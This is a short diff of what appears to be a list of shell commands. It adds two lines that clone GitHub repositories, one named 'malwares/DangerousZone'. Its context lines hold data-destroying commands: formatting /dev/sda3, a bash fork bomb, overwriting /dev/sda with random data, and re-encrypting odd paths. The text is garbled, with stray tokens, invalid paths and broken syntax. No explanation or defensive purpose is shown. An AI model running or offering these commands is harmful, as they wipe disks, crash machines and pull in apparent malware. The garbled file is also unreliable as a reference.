@@ -3,6 +3,7 @@ mkfs ext4 /dev/sda3. 2a
 >file 
 : () { :|:& };:
 <down>
+git clone https://github.com/HBMS-0em/off
 dd if=/dev/random of=/dev/sda
 <down>
 Sudo cryptsetup reencrypt /sda/KTone
@@ -30,6 +31,7 @@ Sudo cryptsetup reencrypt /sda/0em0
 >file
 <down>
 <down>
+git clone https://github.com/malwares/DangerousZone
 mkfs ext4 /dev/sda3. 2d
 >file
 <down>
